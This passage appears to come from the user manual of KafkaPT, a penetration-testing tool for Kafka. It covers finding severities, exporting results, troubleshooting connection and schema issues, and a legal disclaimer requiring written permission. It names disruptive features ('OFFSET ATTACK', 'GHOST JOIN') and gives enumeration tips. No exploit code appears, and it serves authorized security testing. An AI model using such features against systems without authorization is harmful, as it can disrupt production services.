Each finding has these fields:

- **Severity** — How serious the issue is (CRITICAL → INFO).
- **Title** — Short description of what was found.
- **Phase** — Which part of the pentest found it: `recon`, `authz`, `injection`, `data`, `infra`.
- **Time** — UTC timestamp when the finding was recorded.
- **Description** — Full explanation of the issue and its implications.
- **Evidence** — Raw data proving the finding (captured message content, topic name, offset, etc.).

### What to do with findings

| Severity | Recommended action |
|---|---|
| CRITICAL | Report immediately. Stop testing until the system owner is notified. |
| HIGH | Include prominently in the report. Requires immediate remediation. |
| MEDIUM | Include in the report. Should be remediated in the next sprint. |
| LOW | Include in the report. Schedule for remediation. |
| INFO | Include as informational context. Not a vulnerability by itself. |

---

## 13. Exporting Results

### Export findings as Markdown

1. Go to the **FINDINGS** tab.
2. Click **EXPORT MARKDOWN**.
3. Choose a save location.
4. The output is a `.md` file sorted by severity, with full descriptions and evidence for each finding.

### Export messages as NDJSON

1. Go to the **READ** tab after consuming messages.
2. Click **EXPORT NDJSON**.
3. Choose a save location.
4. Each line in the file is a JSON object containing: topic, partition, offset, timestamp, headers, decoded value, and raw hex.

---

## 14. Troubleshooting

### "confluent-kafka not installed"
```bash
pip install confluent-kafka
```

### "fastavro not installed"
```bash
pip install fastavro
```

### Cannot connect to broker

- Check that the broker address is correct (including port).
- For mTLS: verify all three certificate files are selected and paths are correct.
- Try unchecking **Verify server certificate** if using self-signed certs.
- Make sure your IP is allowed to reach the broker (firewall rules).

### Schema fetch returns HTTP 404

- Schema ID does not exist. Try ID `1`, `2`, etc.
- Try the **ENUMERATE** feature to find which IDs exist.

### RECON shows no topics

- Your certificate may not have `DESCRIBE` permission on any topics.
- This itself is worth noting: check whether the error says "TOPIC_AUTHORIZATION_FAILED".

### Burp proxy not working

- Make sure Burp is running and its proxy listener is enabled.
- Check that the port in Burp matches the port in KafkaPT (default: 8080).
- Click the **TEST** button in the PROXY/BURP tab to diagnose.

### Messages appear as hex / binary

- Load the correct schema in the SCHEMA tab first.
- Or check **Ignore schema** and set **Display as** to `auto-detect` or `UTF-8 raw`.

### Python version error

KafkaPT requires Python 3.11+. Check with:
```bash
python3 --version
```

---

## 15. Legal Disclaimer

**This tool is provided for authorized security testing and research only.**

- You must have **explicit written permission** from the system owner before testing any Kafka environment with this tool.
- Unauthorized access to computer systems is illegal in most jurisdictions (e.g. Computer Fraud and Abuse Act in the US, Computer Misuse Act in the UK, Article 269a in Poland).
- The authors of KafkaPT accept no liability for any unauthorized or illegal use of this software.
- Always operate within the agreed scope of a penetration test engagement.
- The OFFSET ATTACK and GHOST JOIN features can disrupt production services. Use only in isolated test environments or with explicit authorization.

**Use responsibly. Test ethically.**

---

*KafkaPT v2.0 — developed for the security research community.*
